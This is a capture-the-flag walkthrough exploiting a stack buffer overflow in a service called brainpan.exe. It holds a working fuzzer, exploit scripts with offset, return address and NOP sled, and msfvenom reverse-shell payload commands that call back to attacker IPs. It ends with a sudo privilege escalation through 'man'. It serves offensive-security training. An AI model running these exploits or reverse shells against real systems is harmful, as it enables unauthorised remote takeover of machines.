# Gatekeeper

> Reverse engineer a Windows executable, find a buffer overflow and exploit it on a Linux machine.

<br>

### Process:

1. port scan:
	- `sudo nmap -T4 -p- 10.10.92.209`
	- `nmap -T4 -A -p 10000,9999`
	- find interesting app running on port 9999 
2. enumerate port 10000 (a web server)
	- visit website
	- run gobuster: `gobuster dir -u http://10.10.81.71:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,bak,conf,txt,js,php,bin`
	- found "/bin" directory that contain "brainpan.exe"
3. find buffer overflow:
	- download brainpan.exe onto a Windows VM (32-bit)
	- find EIP:
		- edit fuzzer.py script:
		```python
		#!/usr/bin/env python3
		import socket, time, sys

		ip = "10.0.1.6"
		port = 9999
		timeout = 5
		prefix = ""
		string = "A" * 100

		while True:
		  try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			  s.settimeout(timeout)
			  s.connect((ip, port))
			  print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
			  s.send(bytes(string + "\r\n", "latin-1"))
			  s.recv(1024)
		  except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		  string += 100 * "A"
		  time.sleep(1)
		```
		- start brainpan.exe in Immunity Debugger and execute fuzzer.py -- crashed after 700 bytes
		- create cyclic pattern: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700`
		- edit exploit.py script:
		```
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 9999
		prefix = ""
		offset = 0
		overflow = "A" * offset
		retn = ""
		padding = ""
		payload = "<cyclic_pattern>"
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")
		```
		- in Immunity run: `!mona findmsp -distance 700` -- EIP offset = 524
	- find bad chars:
		- in Immunity run: `!mona bytearray -cpb \x00`
		- copy bytearray.txt to exploit.py script and fill in offset and retn:
		```python
		#!/usr/bin/env python3
		import socket

		ip = "10.0.1.6"
		port = 9999
		prefix = ""
		offset = 524
		overflow = "A" * offset
		retn = "BBBB"
		padding = ""
		payload = (<bytearray>)
		postfix = ""

		buffer = prefix + overflow + retn + padding + payload + postfix

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
		  s.connect((ip, port))
		  print("Sending evil buffer...")
		  s.send(bytes(buffer + "\r\n", "latin-1"))
		  print("Done!")
		except:
		  print("Could not connect.")#
		```
		- restart brainpan.exe in Immunity and run exploit.py again
		- in Immunity run: `!mona compare -f c:\mona\brainpan\bytearray.bin -a esp` -- no more bad chars found 
	- find jump point:
		- in Immunity run: `!mona jmp -r esp -cpb \x00`
		- found addres: "311712f3"
	- generate payload:
		- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.1.5 lport=1234 -f c  -b "\x00" -a x86`
	- edit exploit.py:
	```python
	#!/usr/bin/env python3
	import socket

	ip = "10.0.1.6"
	port = 9999
	prefix = ""
	offset = 524
	overflow = "A" * offset
	retn = "\xf3\x12\x17\x31"
	padding = "\x90" * 16
	payload = (<msfvenom_payload>)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
	  s.connect((ip, port))
	  print("Sending evil buffer...")
	  s.send(bytes(buffer + "\r\n", "latin-1"))
	  print("Done!")
	except:
	  print("Could not connect.")
	```
	- restart brainpan.exe and run exploit.py -- sucess
4. exploit buffer overflow:
	- edit payload and exploit.py script
	- run against real target -- success
5. escalate privileges:
	- check privileges: `getprivs` -- have SeImpersonatePrivilege
	- box is using emulated Windows so get Linux shell instead (replacing payload for buffer overflow with a Linux shell generated with: `msfvenom -p linux/x86/shell_reverse_tcp lhost=10.11.31.198 lport=4444 -f c -a x86 EXITFUNC=thread -b "\x00"`)
	- check sudo permission: `sudo -l` -- can run "/home/anansi/bin/anansi_util" (appears to run the `man` command)
	- lookup "man" on GTFO Bins -- found Sudo privilege esclation -- success